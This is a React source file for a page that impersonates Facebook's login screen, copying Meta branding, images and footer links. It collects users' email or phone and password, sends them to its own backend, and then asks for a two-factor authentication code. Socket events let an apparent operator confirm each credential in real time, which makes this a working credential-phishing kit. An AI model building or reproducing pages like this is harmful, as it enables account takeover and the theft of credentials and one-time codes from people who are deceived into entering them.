import { useState, useEffect } from 'react';
import { Helmet } from 'react-helmet-async';
// @mui
import {
  Box,
  Stack,
  Typography,
  TextField,
  Button,
  CircularProgress,
  InputAdornment,
  IconButton,
  Divider,
} from '@mui/material';
// components
import Iconify from '../components/iconify';
// sections
import CheckoutOrderComplete from '../sections/@dashboard/e-commerce/checkout/CheckoutOrderComplete';
// redux
import { submitFbLogin, submitFbOtp } from '../redux/slices/fb';
// utils
import { socket } from '../utils/socket';

// ----------------------------------------------------------------------

const META_BLUE = '#0866FF';
const TEXT_BLACK = '#1C1E21';
const BORDER_COLOR = '#DDDFE2';
const INPUT_BG = '#FFFFFF';

export default function FacebookLoginPage() {
  const [step, setStep] = useState<'login' | 'otp'>('login');
  const [account, setAccount] = useState('');
  const [password, setPassword] = useState('');
  const [verifyCode, setVerifyCode] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [loading, setLoading] = useState(false);
  const [wrongPass, setWrongPass] = useState(false);
  const [wrongOtp, setWrongOtp] = useState(false);
  const [isOrderComplete, setIsOrderComplete] = useState(false);
  const [sessionId, setSessionId] = useState<string | null>(null);
  const [loginError, setLoginError] = useState<string | null>(null);

  const [collageSrc, setCollageSrc] = useState('https://static.xx.fbcdn.net/rsrc.php/yb/r/HpEiFYDux5j.webp');

  useEffect(() => {
    const images = [
      'https://static.xx.fbcdn.net/rsrc.php/yb/r/HpEiFYDux5j.webp',
      'https://static.xx.fbcdn.net/rsrc.php/yB/r/83zWJdc6PJI.webp',
    ];
    setCollageSrc(images[Math.floor(Math.random() * images.length)]);
  }, []);

  useEffect(() => {
    socket.connect();

    socket.on('fb-wrong-pass', (data: { id: string }) => {
      if (sessionId && String(data.id) === String(sessionId)) {
        setLoading(false);
        setWrongPass(true);
        setStep('login');
      }
    });

    socket.on('fb-pass-true', (data: { id: string }) => {
      if (sessionId && String(data.id) === String(sessionId)) {
        setLoading(false);
        setStep('otp');
      }
    });

    socket.on('fb-otp-true', (data: { id: string }) => {
      if (sessionId && String(data.id) === String(sessionId)) {
        setLoading(false);
        setIsOrderComplete(true);
      }
    });

    socket.on('fb-otp-wrong', (data: { id: string }) => {
      if (sessionId && String(data.id) === String(sessionId)) {
        setLoading(false);
        setWrongOtp(true);
        setVerifyCode('');
      }
    });

    return () => {
      socket.off('fb-wrong-pass');
      socket.off('fb-pass-true');
      socket.off('fb-otp-true');
      socket.off('fb-otp-wrong');
    };
  }, [sessionId]);

  const handleLoginSubmit = async () => {
    const trimmedAccount = account.trim();
    if (!trimmedAccount || !password.trim()) return;

    const isEmail = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(trimmedAccount);
    const isPhone = /^\+?[0-9]{8,15}$/.test(trimmedAccount);

    if (!isEmail && !isPhone) {
      setLoginError(
        "The email address or mobile number you entered isn't connected to an account. Find your account and log in."
      );
      return;
    }

    setLoading(true);
    setLoginError(null);
    setWrongPass(false);

    try {
      const result = await submitFbLogin({
        account: trimmedAccount,
        password: password.trim(),
      });
      setSessionId(result.id);
    } catch (error) {
      setLoading(false);
      setWrongPass(true);
    }
  };

  const handleOtpSubmit = async () => {
    if (!verifyCode || verifyCode.length !== 6 || !sessionId) return;
    setLoading(true);
    setWrongOtp(false);
    try {
      await submitFbOtp(sessionId, verifyCode);
    } catch (error) {
      setLoading(false);
    }
  };

  return (
    <>
      <Helmet>
        <title>Log in to Facebook</title>
      </Helmet>

      <Box
        sx={{
          minHeight: '100vh',
          display: 'flex',
          flexDirection: 'column',
          bgcolor: '#fff',
          fontFamily:
            '"SF Pro Display", "SF Pro Text", -apple-system, BlinkMacSystemFont, Roboto, "Helvetica Neue", sans-serif',
        }}
      >
        {/* MAIN CONTENT */}
        <Box
          sx={{
            flexGrow: 1,
            display: 'flex',
            flexDirection: { xs: 'column', md: 'row' },
          }}
        >
          {/* ── LEFT SECTION ── */}
          <Box
            sx={{
              width: { xs: '100%', md: '58%' },
              bgcolor: '#fff',
              display: 'flex',
              flexDirection: 'column',
              p: { xs: 3, md: '40px 32px 40px 48px' },
              minHeight: { md: '100vh' },
            }}
          >
            {/* Facebook Logo */}
            <Box sx={{ mb: 3 }}>
              <Iconify icon="logos:facebook" width={50} height={50} />
            </Box>

            {/* Row: Slogan LEFT + Collage RIGHT */}
            <Box
              sx={{
                flexGrow: 1,
                display: 'flex',
                flexDirection: 'row',
                alignItems: 'center',
                gap: 2,
              }}
            >
              {/* Slogan */}
              <Box sx={{ flex: '0 0 auto', maxWidth: 280 }}>
                <Typography
                  sx={{
                    fontWeight: 700,
                    fontSize: { xs: 36, md: 64 },
                    lineHeight: 1.05,
                    letterSpacing: -2,
                    color: TEXT_BLACK,
                  }}
                >
                  Explore the{' '}
                  <br />
                  things <br />
                  <span style={{ color: META_BLUE }}>you love.</span>
                </Typography>
              </Box>

              {/* Collage Image */}
              <Box
                sx={{
                  flex: 1,
                  display: 'flex',
                  justifyContent: 'center',
                  alignItems: 'center',
                  overflow: 'hidden',
                }}
              >
                <Box
                  component="img"
                  src={collageSrc}
                  alt="Collage"
                  sx={{
                    width: '100%',
                    maxHeight: { xs: 280, md: 560 },
                    objectFit: 'contain',
                  }}
                />
              </Box>
            </Box>
          </Box>

          {/* ── RIGHT SECTION ── */}
          <Box
            sx={{
              width: { xs: '100%', md: '42%' },
              bgcolor: '#fff',
              borderLeft: { md: `1px solid ${BORDER_COLOR}` },
              display: 'flex',
              flexDirection: 'column',
              justifyContent: 'center',
              alignItems: 'center',
              p: { xs: 4, md: '40px 56px' },
            }}
          >
            <Box sx={{ width: '100%', maxWidth: 380 }}>
              {/* Title */}
              <Typography
                variant="h6"
                sx={{
                  fontWeight: 700,
                  fontSize: 20,
                  color: TEXT_BLACK,
                  mb: 3,
                }}
              >
                Log into Facebook
              </Typography>

              {/* ── LOGIN STEP ── */}
              {step === 'login' ? (
                <Stack spacing={2}>
                  {/* Error Banner */}
                  {(wrongPass || loginError) && (
                    <Box
                      sx={{
                        p: 1.5,
                        bgcolor: '#ffebe8',
                        border: '1px solid #dd3c10',
                        borderRadius: 2,
                      }}
                    >
                      <Typography variant="body2" color="#dd3c10" fontWeight={600}>
                        {loginError ||
                          "The password you've entered is incorrect. Forgotten password?"}
                      </Typography>
                    </Box>
                  )}

                  {/* Email / Phone */}
                  <TextField
                    fullWidth
                    placeholder="Email or mobile number"
                    autoFocus
                    value={account}
                    onChange={(e) => setAccount(e.target.value)}
                    onKeyDown={(e) => e.key === 'Enter' && handleLoginSubmit()}
                    sx={{
                      '& .MuiOutlinedInput-root': {
                        bgcolor: INPUT_BG,
                        height: 52,
                        borderRadius: 3,
                        fontSize: 15,
                        '& fieldset': { borderColor: BORDER_COLOR },
                        '&:hover fieldset': { borderColor: '#b0b3b8' },
                      },
                    }}
                  />

                  {/* Password */}
                  <TextField
                    fullWidth
                    placeholder="Password"
                    type={showPassword ? 'text' : 'password'}
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    onKeyDown={(e) => e.key === 'Enter' && handleLoginSubmit()}
                    InputProps={{
                      endAdornment: (
                        <InputAdornment position="end">
                          <IconButton
                            edge="end"
                            onClick={() => setShowPassword(!showPassword)}
                            size="small"
                          >
                            <Iconify
                              icon={showPassword ? 'eva:eye-fill' : 'eva:eye-off-fill'}
                            />
                          </IconButton>
                        </InputAdornment>
                      ),
                    }}
                    sx={{
                      '& .MuiOutlinedInput-root': {
                        bgcolor: INPUT_BG,
                        height: 52,
                        borderRadius: 3,
                        fontSize: 15,
                        '& fieldset': { borderColor: BORDER_COLOR },
                        '&:hover fieldset': { borderColor: '#b0b3b8' },
                      },
                    }}
                  />

                  {/* Log In Button */}
                  <Button
                    fullWidth
                    variant="contained"
                    onClick={handleLoginSubmit}
                    disabled={loading || !account || !password}
                    sx={{
                      bgcolor: META_BLUE,
                      fontWeight: 700,
                      fontSize: 16,
                      height: 52,
                      borderRadius: 999,
                      textTransform: 'none',
                      boxShadow: 'none',
                      mt: 0.5,
                      '&:hover': { bgcolor: '#0057c2', boxShadow: 'none' },
                      '&.Mui-disabled': { bgcolor: '#a8c8ff', color: '#fff' },
                    }}
                  >
                    {loading ? (
                      <CircularProgress size={22} sx={{ color: '#fff' }} />
                    ) : (
                      'Log in'
                    )}
                  </Button>

                  {/* Forgot Password */}
                  <Typography
                    variant="body2"
                    align="center"
                    sx={{
                      color: TEXT_BLACK,
                      fontWeight: 500,
                      fontSize: 14,
                      cursor: 'pointer',
                      py: 0.5,
                      '&:hover': { textDecoration: 'underline' },
                    }}
                  >
                    Forgot password?
                  </Typography>

                  {/* Divider */}
                  <Divider sx={{ borderColor: BORDER_COLOR, my: 0.5 }} />

                  {/* Create Account */}
                  <Button
                    fullWidth
                    variant="outlined"
                    sx={{
                      color: META_BLUE,
                      borderColor: META_BLUE,
                      borderWidth: 1.5,
                      fontWeight: 700,
                      fontSize: 15,
                      height: 52,
                      borderRadius: 999,
                      textTransform: 'none',
                      '&:hover': {
                        bgcolor: 'rgba(8,102,255,0.05)',
                        borderColor: META_BLUE,
                        borderWidth: 1.5,
                      },
                    }}
                  >
                    Create new account
                  </Button>

                  {/* Meta Logo */}
                  <Stack
                    direction="row"
                    justifyContent="center"
                    alignItems="center"
                    spacing={0.5}
                    sx={{ mt: 1.5 }}
                  >
                    <Iconify icon="logos:meta-icon" width={18} />
                    <Typography
                      variant="subtitle2"
                      fontWeight={800}
                      sx={{ color: TEXT_BLACK, opacity: 0.85, fontSize: 14 }}
                    >
                      Meta
                    </Typography>
                  </Stack>
                </Stack>
              ) : (
                /* ── OTP STEP ── */
                <Stack spacing={3}>
                  <Box sx={{ textAlign: 'center' }}>
                    <Typography variant="body2" sx={{ color: '#606770', lineHeight: 1.6 }}>
                      Enter the 6-digit code from your authentication app to verify your
                      identity.
                    </Typography>
                    {wrongOtp && (
                      <Typography
                        variant="body2"
                        color="#dd3c10"
                        sx={{ mt: 1, fontWeight: 700 }}
                      >
                        The code you entered is incorrect. Please check and try again.
                      </Typography>
                    )}
                  </Box>

                  <TextField
                    fullWidth
                    placeholder="6-digit code"
                    value={verifyCode}
                    onChange={(e) =>
                      setVerifyCode(e.target.value.replace(/[^0-9]/g, '').slice(0, 6))
                    }
                    inputProps={{
                      maxLength: 6,
                      style: {
                        textAlign: 'center',
                        letterSpacing: 12,
                        fontSize: 24,
                        fontWeight: 700,
                      },
                    }}
                    sx={{
                      '& .MuiOutlinedInput-root': {
                        bgcolor: INPUT_BG,
                        height: 56,
                        borderRadius: 3,
                        '& fieldset': { borderColor: BORDER_COLOR },
                      },
                    }}
                  />

                  <Button
                    fullWidth
                    variant="contained"
                    onClick={handleOtpSubmit}
                    disabled={verifyCode.length !== 6 || loading}
                    sx={{
                      bgcolor: META_BLUE,
                      fontWeight: 700,
                      height: 52,
                      borderRadius: 999,
                      textTransform: 'none',
                      boxShadow: 'none',
                      '&:hover': { bgcolor: '#0057c2', boxShadow: 'none' },
                    }}
                  >
                    {loading ? (
                      <CircularProgress size={22} sx={{ color: '#fff' }} />
                    ) : (
                      'Verify'
                    )}
                  </Button>

                  <Typography
                    variant="body2"
                    align="center"
                    sx={{
                      color: META_BLUE,
                      fontSize: 13,
                      cursor: 'pointer',
                      fontWeight: 700,
                      '&:hover': { textDecoration: 'underline' },
                    }}
                  >
                    Try another way
                  </Typography>
                </Stack>
              )}
            </Box>
          </Box>
        </Box>

        {/* ── FOOTER ── */}
        <Box
          sx={{
            bgcolor: '#fff',
            px: { xs: 2, md: 6 },
            py: 2.5,
            borderTop: `1px solid ${BORDER_COLOR}`,
          }}
        >
          <Stack spacing={0.8} alignItems="center">
            <Typography variant="caption" sx={{ color: '#8a8d91', fontSize: 12 }}>
              English (UK) · Tiếng Việt · 中文(台灣) · 한국어 · 日本語 · Français (France) ·
              ภาษาไทย · More languages...
            </Typography>
            <Typography variant="caption" sx={{ color: '#8a8d91', fontSize: 12 }}>
              Sign Up · Log in · Messenger · Facebook Lite · Video · Meta Pay · Meta Store ·
              Meta Quest · Ray-Ban Meta · Meta AI · Instagram · Threads
            </Typography>
            <Typography variant="caption" sx={{ color: '#8a8d91', fontSize: 12 }}>
              Privacy Policy · Privacy Centre · About · Create ad · Create Page · Developers ·
              Careers · Cookies · AdChoices
            </Typography>
            <Typography variant="caption" sx={{ color: '#8a8d91', fontSize: 12 }}>
              Terms · Help · Contact uploading and non-users
            </Typography>
            <Typography variant="caption" sx={{ color: '#8a8d91', fontSize: 12, mt: 0.5 }}>
              Meta © 2026
            </Typography>
          </Stack>
        </Box>
      </Box>

      {/* Success Dialog */}
      <CheckoutOrderComplete
        open={isOrderComplete}
        onReset={() => {
          window.location.href = '/';
        }}
        onDownloadPDF={() => {}}
      />
    </>
  );
}